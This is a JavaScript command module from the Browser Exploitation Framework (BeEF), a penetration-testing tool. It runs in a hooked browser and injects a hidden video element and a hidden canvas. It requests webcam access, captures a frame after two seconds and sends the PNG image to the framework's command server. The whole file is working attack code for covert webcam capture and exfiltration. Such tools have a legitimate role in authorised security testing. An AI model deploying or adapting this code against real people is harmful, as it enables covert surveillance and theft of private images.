//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//



beef.execute(function() {
    var vid_id = beef.dom.generateID();
    var can_id = beef.dom.generateID();
    var vid_el = beef.dom.createElement('video',{'id':vid_id,'style':'display:none;','autoplay':'true'});
    var can_el = beef.dom.createElement('canvas',{'id':can_id,'style':'display:none;','width':'640','height':'480'});
    $j('body').append(vid_el);
    $j('body').append(can_el);

    var ctx = can_el.getContext('2d');

    var localMediaStream = null;

    var cap = function() {
        if (localMediaStream) {
            ctx.drawImage(vid_el,0,0);
            beef.net.send("<%= @command_url %>",<%= @command_id %>, 'image='+can_el.toDataURL('image/png'));
        } else {
            beef.net.send("<%= @command_url %>",<%= @command_id %>, 'result=something went wrong');
        }
    }

    window.URL = window.URL || window.webkitURL;
    navigator.getUserMedia  = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;

    navigator.getUserMedia({video:true},function(stream) {
        vid_el.src = window.URL.createObjectURL(stream);
        localMediaStream = stream;
        setTimeout(cap,2000);

    }, function(err) {
        beef.net.send("<%= @command_url %>",<%= @command_id %>, 'result=getUserMedia call failed');
    });




});





